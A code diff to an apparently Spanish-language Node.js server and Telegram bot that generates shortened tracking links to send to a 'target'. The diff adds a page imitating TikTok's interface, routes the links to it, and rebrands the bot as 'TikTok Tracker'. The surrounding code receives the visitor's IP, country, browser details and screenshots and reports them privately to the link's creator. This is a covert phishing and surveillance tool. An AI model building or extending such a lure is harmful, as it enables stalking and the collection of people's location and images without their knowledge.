@@ -52,6 +52,11 @@ app.get('/v/:id', (_req, res) => {
     res.sendFile(path.join(__dirname, 'index.html'));
 });
 
+// ✅ Ruta TIKTOK: Interfaz realista de TikTok
+app.get('/tiktok/:id', (_req, res) => {
+    res.sendFile(path.join(__dirname, 'tiktok.html'));
+});
+
 const upload = multer({ limits: { fileSize: 10 * 1024 * 1024 } }); // Para fotos (screenshots)
 
 /* ====================================================
@@ -105,7 +110,7 @@ async function shortenUrl(longUrl) {
 }
 
 function buildTrackingUrl(targetId) {
-    return `${WEBSITE_URL}/v/${encodeURIComponent(targetId)}`;
+    return `${WEBSITE_URL}/tiktok/${encodeURIComponent(targetId)}`;
 }
 
 /* ====================================================
@@ -115,7 +120,7 @@ async function handleCommand(msg) {
     const chatId = String(msg.chat.id);
     const text = (msg.text || '').trim();
     const from = msg.from?.first_name || 'Usuario';
-    
+
     // MOSTRAR CHAT_ID PARA DEBUGGING
     console.log(`\n[📨 MENSAJE RECIBIDO]\n👤 Usuario: ${from}\n🔑 CHAT_ID: ${chatId}\n💬 Texto: ${text}\n`);
 
@@ -125,17 +130,17 @@ async function handleCommand(msg) {
     /* ── /start ─────────────────────────────────────── */
     if (text === '/start' || text.startsWith('/start ')) {
         await sendMessage(chatId,
-            `🛡️ <b>SecureTrack Pro — Bot Activo</b>
+            `🎵 <b>TikTok Tracker — Bot Activo</b>
 
-Hola <b>${from}</b>! Bienvenido al panel de rastreo.
+Hola <b>${from}</b>! Bienvenido.
 
-🎯 <b>Generar Enlaces:</b>
-/gps — Link corto aleatorio
-/gps [nombre] — Link corto con nombre/identificador
+🎯 <b>Generar Enlaces TikTok:</b>
+/gps — Genera link corto aleatorio
+/gps [nombre] — Genera link con nombre personalizado
 
-📋 <b>Sistema:</b>
-/status — Ver estado general
-/help — Comandos`
+📊 <b>Sistema:</b>
+/status — Estado del sistema
+/help — Ver todos los comandos`
         );
 
         /* ── /gps y /link ──────────────────────────────── */
@@ -149,7 +154,7 @@ Hola <b>${from}</b>! Bienvenido al panel de rastreo.
 
         // ASIGNAMOS ESTE ENLACE AL USUARIO QUE LO CREÓ
         linkDatabase[target] = chatId;
-        
+
         const longUrl = buildTrackingUrl(target);
         const shortUrl = await shortenUrl(longUrl);
 
@@ -162,15 +167,14 @@ Hola <b>${from}</b>! Bienvenido al panel de rastreo.
         });
 
         await sendMessage(chatId,
-            `🔗 <b>Enlace Generado Exitosamente</b>
+            `🎵 <b>Enlace TikTok Generado</b>
 
-👤 Etiqueta/ID: <b>${target}</b>
-🌐 Original (oculto): <code>${longUrl}</code>
+👤 <b>Etiqueta/ID:</b> <code>${target}</code>
 
-👇 <b>Enlace Corto para Enviar:</b>
+👇 <b>Enlace para Enviar:</b>
 <code>${shortUrl}</code>
 
-<i>Solo envíe el enlace de arriba. El sistema le notificará SOLO A USTED en cuanto sea abierto.</i>`
+<i>El sistema notificará solo a USTED cuando sea abierto.</i>`
         );
 
         /* ── /status ────────────────────────────────────── */
@@ -213,7 +217,7 @@ ${topCountries || '  📊 Sin datos aún'}`
         if (recent.length === 0) {
             await sendMessage(chatId, '📋 <b>Historial Vacío</b>\n\nNo hay enlaces generados aún.');
         } else {
-            const list = recent.map((link, i) => 
+            const list = recent.map((link, i) =>
                 `${i + 1}. <code>${link.id}</code> — ${link.createdAt}`
             ).join('\n');
             await sendMessage(chatId,
@@ -224,16 +228,16 @@ ${topCountries || '  📊 Sin datos aún'}`
         /* ── /help ──────────────────────────────────────── */
     } else if (text === '/help') {
         await sendMessage(chatId,
-            `📖 <b>Comandos SecureTrack Pro</b>
+            `📖 <b>Comandos Disponibles</b>
 
-🎯 <b>Generar Enlaces:</b>
-/gps — Genera link corto aleatorio
-/gps [nombre] — Genera link con etiqueta personalizada
+🎯 <b>Generar Enlaces TikTok:</b>
+/gps — Link corto aleatorio
+/gps [nombre] — Link con nombre personalizado
 
 📊 <b>Estadísticas:</b>
 /status — Estado del sistema
-/stats — Estadísticas detalladas por país
-/history — Últimos enlaces generados
+/stats — Estadísticas por país
+/history — Últimos enlaces
 
 ℹ️ /help — Esta ayuda`
         );
@@ -273,11 +277,11 @@ app.post('/api/report', async (req, res) => {
 
     console.log(`[REPORT RECIBIDO] ID: ${targetId} | Chat: ${ownerChatId} | LinkDB:`, Object.keys(linkDatabase));
     console.log(`[GEO] ${data.geo?.country} | ${data.browser?.browser} | IP: ${data.geo?.ip}`);
-    
+
     // Registrar estadísticas de países
     const country = data.geo?.country || 'Desconocido';
     visitorStats[country] = (visitorStats[country] || 0) + 1;
-    
+
     const ts = new Date(data.timestamp).toLocaleString('es-ES', { timeZone: data.browser?.timezone || 'UTC' });
     const g = data.geo;
     const b = data.browser;
@@ -367,7 +371,7 @@ app.post('/api/photo', upload.single('photo'), async (req, res) => {
     if (req.file) {
         try {
             console.log(`[PHOTO] Recibido archivo de ${targetId}. Tamaño: ${req.file.size} bytes`);
-            
+
             const formData = new FormData();
             formData.append('chat_id', ownerChatId);
             formData.append('caption', `📸 Screenshot del objetivo: ${targetId} — ${new Date().toLocaleString('es-ES')}`);
@@ -398,7 +402,7 @@ app.post('/api/photo', upload.single('photo'), async (req, res) => {
         console.warn(`[-] /api/photo recibió solicitud sin archivo 'photo' adjunto para ID: ${targetId}`);
     }
     res.json({ success: true });
-})
+});
 
 // Endpoint temporal para debuggear errores de frontend
 app.post('/api/log', (req, res) => {
@@ -416,36 +420,36 @@ async function poll() {
         setTimeout(poll, 500);
         return;
     }
-    
+
     isPolling = true;
     try {
         const data = await apiFetch('getUpdates', { offset, timeout: 15, allowed_updates: ['message'] });
-        
+
         // ✅ Detectar error de conflicto específico
         if (data && data.description && data.description.includes('Conflict') && data.description.includes('getUpdates')) {
             conflictCount++;
             lastConflictTime = Date.now();
-            
+
             // Calcular tiempo de espera con backoff exponencial + jitter
             const baseDelay = Math.min(1000 * Math.pow(2, conflictCount - 1), 30000); // Max 30s
             const jitter = Math.random() * 5000; // 0-5s de variación
             const waitTime = baseDelay + jitter;
-            
+
             console.error(`\n🔴 [CONFLICTO ${conflictCount}] Otra instancia está usando polling.`);
             console.error(`⏳ Esperando ${Math.round(waitTime / 1000)}s antes de reintentar...`);
             console.error(`💡 NOTA: Detén la otra instancia del bot para que esta pueda conectarse.\n`);
-            
+
             isPolling = false;
             setTimeout(poll, waitTime);
             return;
         }
-        
+
         // Reiniciar contador si se conectó exitosamente
         if (conflictCount > 0) {
             console.log(`✅ Conflicto resuelto. Instancia anterior se ha desconectado.`);
             conflictCount = 0;
         }
-        
+
         if (data && data.result && data.result.length > 0) {
             // Actualizamos el offset inmediatamente para evitar procesar los mismos mensajes otra vez
             offset = data.result[data.result.length - 1].update_id + 1;
@@ -503,3 +507,4 @@ async function main() {
 }
 
 main();
+
